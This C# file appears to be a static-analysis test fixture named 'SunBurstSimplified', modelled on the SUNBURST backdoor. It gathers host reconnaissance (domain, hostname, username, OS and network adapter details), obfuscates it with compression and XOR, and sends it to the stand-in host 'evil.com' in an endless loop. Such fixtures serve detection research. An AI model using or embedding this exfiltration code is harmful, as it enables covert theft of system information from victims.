// semmle-extractor-options: /r:netstandard.dll /r:System.Linq.dll /r:System.Collections.Specialized.dll /r:System.Private.Uri.dll /r:System.Net.NetworkInformation.dll /r:System.Net.Requests.dll /r:System.ComponentModel.Primitives.dll /r:System.Core.dll /r:System.Net.WebHeaderCollection.dll /r:System.Net.Primitives.dll /r:System.Net.dll /r:System.Net.Http.dll /r:System.IO.dll /r:System.IO.Compression.dll /r:System.Net.ServicePoint.dll /r:System.Net.WebHeaderCollection.dll /r:${testdir}/../../../../../packages/System.Management.5.0.0/lib/netstandard2.0/System.Management.dll 

using System;

using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Net.NetworkInformation;
using System.Text;


public class SunBurstSimplified
{
	public SunBurstSimplified()
	{
	}

	public static void Main()
	{
		try
		{
			int i = 1;
			while (i <= 3)
			{
				byte[] body = null;

				CollectSystemDescription("info", out string response);
				HttpStatusCode httpStatusCode = CreateUploadRequest(0, response, out body);
				string[] args = new string[3];
				args[0] = "https://www.evil.com?"+response;
				args[1] = response;
				args[2] = response;

				// unused (?) Solarigate upload method
				UploadSystemDescription(args, out string result, null);

				// how we normally do it
				HttpClientUpload(args[0], args[1], args[1], out string responseMessage);
			}
		}
		catch (Exception)
		{
		}
	}
	public static void CollectSystemDescription(string info, out string result)
	{
		result = null;
		string domainName = IPGlobalProperties.GetIPGlobalProperties().DomainName;
		result = result + domainName;
		try
		{
			string str = "Administrator";
			result = result + str;
		}
		catch
		{

		}
		result = result + IPGlobalProperties.GetIPGlobalProperties().HostName;
		result = result + Environment.UserName;
		result = result + GetOSVersion(true);
		result = result + Environment.SystemDirectory;
		result = result + (int)TimeSpan.FromMilliseconds(Environment.TickCount).TotalDays;
		result = result + info + "\n";
		result += GetNetworkAdapterConfiguration();
	}

	private static string GetOSVersion(bool full)
	{
		string osVersion = null;
		string osInfo = null;
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_OperatingSystem");
			{
				ManagementObject managementObject = managementObjectSearcher.Get().Cast<ManagementObject>().FirstOrDefault<ManagementObject>();
				osInfo = managementObject.Properties["Caption"].Value.ToString();
				osInfo = osInfo + ";" + managementObject.Properties["OSArchitecture"].Value.ToString();
				osInfo = osInfo + ";" + managementObject.Properties["InstallDate"].Value.ToString();
				osInfo = osInfo + ";" + managementObject.Properties["Organization"].Value.ToString();
				osInfo = osInfo + ";" + managementObject.Properties["RegisteredUser"].Value.ToString();
				string text = managementObject.Properties["Version"].Value.ToString();
				osInfo = osInfo + ";" + text;
				string[] array = text.Split(new char[]
				{
						'.'
				});
				osVersion = array[0] + "." + array[1];
			}
		}
		catch (Exception)
		{
			osVersion = Environment.OSVersion.Version.Major + "." + Environment.OSVersion.Version.Minor;
			osInfo = string.Format("[E] {0} {1} {2}", Environment.OSVersion.VersionString, Environment.OSVersion.Version, Environment.Is64BitOperatingSystem ? 64 : 32);
		}
		if (!full)
		{
			return osVersion;
		}
		return osInfo;
	}

	private static string GetNetworkAdapterConfiguration()
	{
		string text = "";
		string result;
		try
		{
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true");
			{
				foreach (ManagementObject obj in managementObjectSearcher.Get().Cast<ManagementObject>())
				{
					text += "\n";
					text += GetManagementObjectProperty(obj, "Description");
					text += GetManagementObjectProperty(obj, "MACAddress");
					text += GetManagementObjectProperty(obj, "DHCPEnabled");
					text += GetManagementObjectProperty(obj, "DHCPServer");
					text += GetManagementObjectProperty(obj, "DNSHostName");
					text += GetManagementObjectProperty(obj, "DNSDomainSuffixSearchOrder");
					text += GetManagementObjectProperty(obj, "DNSServerSearchOrder");
					text += GetManagementObjectProperty(obj, "IPAddress");
					text += GetManagementObjectProperty(obj, "IPSubnet");
					text += GetManagementObjectProperty(obj, "DefaultIPGateway");
				}
				result = text;
			}
		}
		catch (Exception ex)
		{
			result = text + ex.Message;
		}
		return result;
	}

	private static string GetManagementObjectProperty(ManagementObject obj, string property)
	{
		object value = obj.Properties[property].Value;
		string text;
		if (((value != null) ? value.GetType() : null) == typeof(string[]))
		{
			text = string.Join(", ", from v in (string[])obj.Properties[property].Value
									 select v.ToString());
		}
		else
		{
			object value2 = obj.Properties[property].Value;
			if (value2 != null)
			{
				if ((text = value2.ToString()) != null)
				{
					goto IL_9A;
				}
			}
			text = "";
		}
	IL_9A:
		string str = text;
		return property + ": " + str + "\n";
	}

	private static HttpStatusCode  CreateUploadRequest(int err, string response, out byte[] outData)
	{
		string text = "httpHost";
		byte[] array = null;
		byte[] customerId = { 1, 2, 3, 4, 5 };
		outData = null;
		HttpMethod httpOipExMethods2 = HttpMethod.Post;
		try
		{
			if (!string.IsNullOrEmpty(response))
			{
				byte[] bytes = Encoding.UTF8.GetBytes(response);
				byte[] bytes2 = BitConverter.GetBytes(err);
				byte[] array2 = new byte[bytes.Length + bytes2.Length + customerId.Length];
				Array.Copy(bytes, array2, bytes.Length);
				Array.Copy(bytes2, 0, array2, bytes.Length, bytes2.Length);
				Array.Copy(customerId, 0, array2, bytes.Length + bytes2.Length, customerId.Length);
				array = Inflate(array2);
			}
			if (!text.StartsWith(Uri.UriSchemeHttp + "://", StringComparison.OrdinalIgnoreCase) && !text.StartsWith(Uri.UriSchemeHttps + "://", StringComparison.OrdinalIgnoreCase))
			{
				text = Uri.UriSchemeHttps + "://" + text;
			}
			if (!text.EndsWith("/"))
			{
				text += "/";
			}
			HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(text);
			if (httpOipExMethods2 == HttpMethod.Get || httpOipExMethods2 == HttpMethod.Head)
			{
				httpWebRequest.Headers.Add("If-None-Match", "blah");
			}
			
			if (httpOipExMethods2 == HttpMethod.Post )
			{
				httpWebRequest.ContentType = "application/octet-stream";
			}
			return CreateUploadRequestImpl(httpWebRequest, array, out outData);
		}
		catch (Exception)
		{
		}
		return (HttpStatusCode)0;
	}

	private static byte[] Inflate(byte[] body)
	{
		byte[] array = ZipHelper.Compress(body);
		byte[] array2 = new byte[array.Length + 1];
		
		array2[0] = (byte)array.Sum((byte b) => (int)b);
		for (int i = 0; i < array.Length; i++)
		{
			byte[] array3 = array;
			int num = i;
			array3[num] ^= array2[0];
		}
		
		Array.Copy(array, 0, array2, 1, array.Length);
		return array2;
	}

	private static HttpStatusCode CreateUploadRequestImpl(HttpWebRequest request, byte[] inData, out byte[] outData)
	{
		outData = null;
		try
		{
			request.KeepAlive = false;
			request.Timeout = 120000;
			request.Method = "GET";
			if (inData != null)
			{
				request.Method = "POST";
				using (Stream requestStream = request.GetRequestStream())
				{
					requestStream.Write(inData, 0, inData.Length);
				}
			}
			using (WebResponse response = request.GetResponse())
			{
				using (Stream responseStream = response.GetResponseStream())
				{
					byte[] array = new byte[4096];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int count;
						while ((count = responseStream.Read(array, 0, array.Length)) > 0)
						{
							memoryStream.Write(array, 0, count);
						}
						outData = memoryStream.ToArray();
					}
				}
				return ((HttpWebResponse)response).StatusCode;
			}
		}
		catch (WebException ex)
		{
			if (ex.Status == WebExceptionStatus.ProtocolError && ex.Response != null)
			{
				return ((HttpWebResponse)ex.Response).StatusCode;
			}
		}
		catch (Exception)
		{
		}
		return HttpStatusCode.Unused;
	}
	public static void UploadSystemDescription(string[] args, out string result, IWebProxy proxy)
	{
		result = null;
		string requestUriString = args[0];
		string s = args[1];
		string text = (args.Length >= 3) ? args[2] : null;
		string[] array = Encoding.UTF8.GetString(Convert.FromBase64String(s)).Split(new string[]
		{
					"\r\n",
					"\r",
					"\n"
		}, StringSplitOptions.None);
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		HttpWebRequest httpWebRequest2 = httpWebRequest;
		httpWebRequest.Proxy = proxy;
		httpWebRequest.Timeout = 120000;
		httpWebRequest.Method = array[0].Split(new char[]
		{
					' '
		})[0];
		foreach (string text2 in array)
		{
			int num = text2.IndexOf(':');
			if (num > 0)
			{
				string text3 = text2.Substring(0, num);
				string text4 = text2.Substring(num + 1).TrimStart(Array.Empty<char>());
				if (!WebHeaderCollection.IsRestricted(text3))
				{
					httpWebRequest.Headers.Add(text2);
				}
				else
				{
					ulong hash = GetHash(text3.ToLower());
					if (hash <= 8873858923435176895UL /* expect (HTTP header (client)) */)
					{
						if (hash <= 6116246686670134098UL /* content-type (HTTP header) */)
						{
							if (hash != 2734787258623754862UL /* accept (HTTP header) */)
							{
								if (hash == 6116246686670134098UL /* content-type (HTTP header) */)
								{
									httpWebRequest.ContentType = text4;
								}
							}
							else
							{
								httpWebRequest.Accept = text4;
							}
						}
						else if (hash != 7574774749059321801UL /* user-agent (HTTP header (client)) */)
						{
							if (hash == 8873858923435176895UL /* expect (HTTP header (client)) */)
							{
								if (GetHash(text4.ToLower()) == 1475579823244607677UL /* 100-continue (HTTP status) */)
								{
									httpWebRequest.ServicePoint.Expect100Continue = true;
								}
								else
								{
									httpWebRequest.Expect = text4;
								}
							}
						}
						else
						{
							httpWebRequest.UserAgent = text4;
						}
					}
					else if (hash <= 11266044540366291518UL /* connection (HTTP header) */)
					{
						if (hash != 9007106680104765185UL /* referer (HTTP header (client)) */)
						{
							if (hash == 11266044540366291518UL /* connection (HTTP header) */)
							{
								ulong hash2 = GetHash(text4.ToLower());
								httpWebRequest.KeepAlive = (hash2 == 13852439084267373191UL /* keep-alive (HTTP header) */ || httpWebRequest.KeepAlive);
								httpWebRequest.KeepAlive = (hash2 != 14226582801651130532UL /* close (HTTP header) */ && httpWebRequest.KeepAlive);
							}
						}
						else
						{
							httpWebRequest.Referer = text4;
						}
					}
					else if (hash != 15514036435533858158UL /* if-modified-since (HTTP header (client)) */)
					{
						if (hash == 16066522799090129502UL /* date (HTTP header) */)
						{
							httpWebRequest.Date = DateTime.Parse(text4);
						}
					}
					else
					{
						httpWebRequest.Date = DateTime.Parse(text4);
					}
				}
			}
		}
		result += string.Format("{0} {1} HTTP/{2}\n", httpWebRequest.Method, httpWebRequest.Address.PathAndQuery, httpWebRequest.ProtocolVersion.ToString());
		result = result + httpWebRequest.Headers.ToString() + "\n\n";
		if (!string.IsNullOrEmpty(text))
		{
			using (Stream requestStream = httpWebRequest.GetRequestStream())
			{
				byte[] array3 = Convert.FromBase64String(text);
				requestStream.Write(array3, 0, array3.Length);
			}
		}
		using (WebResponse response = httpWebRequest.GetResponse())
		{
			result += string.Format("{0} {1}\n", (int)((HttpWebResponse)response).StatusCode, ((HttpWebResponse)response).StatusDescription);
			result = result + response.Headers.ToString() + "\n";
			using (Stream responseStream = response.GetResponseStream())
			{
				result += new StreamReader(responseStream).ReadToEnd();
			}
		}
	}
	private static ulong GetHash(string s)
	{
		ulong num = 14695981039346656037UL; /* NOT A HASH - FNV base offset */
		try
		{
			foreach (byte b in Encoding.UTF8.GetBytes(s))
			{
				num ^= (ulong)b;
				num *= 1099511628211UL; /* NOT A HASH - FNV prime */
			}
		}
		catch
		{
		}
		return num ^ 6605813339339102567UL; /* NOT A HASH - XOR value */
	}

	public static string HttpClientUpload (string url, string headers, string body, out string responseMessage)
    {
		using (HttpClient client = new HttpClient())
		{
			client.DefaultRequestHeaders.Accept.Add(
				new MediaTypeWithQualityHeaderValue(headers));

			HttpContent content = new StringContent(body, Encoding.ASCII, "application/x-yaml");

			using (HttpResponseMessage response = client.PostAsync(url, content).Result)
			{
				responseMessage = response.ReasonPhrase;
				if (response.IsSuccessStatusCode)
				{
					string responseBody = response.Content.ReadAsStringAsync().Result;
					return responseBody;
				}
				else
				{
					return null;
				}
			}
		}
	}

	private string GetAuthenticatedRequest(string url, string bearerToken, out string responseMessage)
	{
		using (HttpClient client = new HttpClient())
		{
			client.DefaultRequestHeaders.Accept.Add(
				new MediaTypeWithQualityHeaderValue("application/json"));

			HttpContent content = new StringContent(string.Empty, Encoding.ASCII, "application/x-yaml");

			client.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", bearerToken);

			using (HttpResponseMessage response = client.GetAsync(url).Result)
			{
				responseMessage = response.ReasonPhrase;
				if (response.IsSuccessStatusCode)
				{
					string responseBody = response.Content.ReadAsStringAsync().Result;
					return responseBody;
				}
				else
				{
					return null;
				}
			}
		}
	}
}

static class ZipHelper
{
	public static byte[] Compress(byte[] input)
	{
		byte[] result;
		using (MemoryStream memoryStream = new MemoryStream(input))
		{
			using (MemoryStream memoryStream2 = new MemoryStream())
			{
				using (DeflateStream deflateStream = new DeflateStream(memoryStream2, CompressionMode.Compress))
				{
					memoryStream.CopyTo(deflateStream);
				}
				result = memoryStream2.ToArray();
			}
		}
		return result;
	}

	public static byte[] Decompress(byte[] input)
	{
		byte[] result;
		using (MemoryStream memoryStream = new MemoryStream(input))
		{
			using (MemoryStream memoryStream2 = new MemoryStream())
			{
				using (DeflateStream deflateStream = new DeflateStream(memoryStream, CompressionMode.Decompress))
				{
					deflateStream.CopyTo(memoryStream2);
				}
				result = memoryStream2.ToArray();
			}
		}
		return result;
	}

	public static string Zip(string input)
	{
		if (string.IsNullOrEmpty(input))
		{
			return input;
		}
		string result;
		try
		{
			result = Convert.ToBase64String(ZipHelper.Compress(Encoding.UTF8.GetBytes(input)));
		}
		catch (Exception)
		{
			result = "";
		}
		return result;
	}

	public static string Unzip(string input)
	{
		if (string.IsNullOrEmpty(input))
		{
			return input;
		}
		string result;
		try
		{
			byte[] bytes = ZipHelper.Decompress(Convert.FromBase64String(input));
			result = Encoding.UTF8.GetString(bytes);
		}
		catch (Exception)
		{
			result = input;
		}
		return result;
	}
}

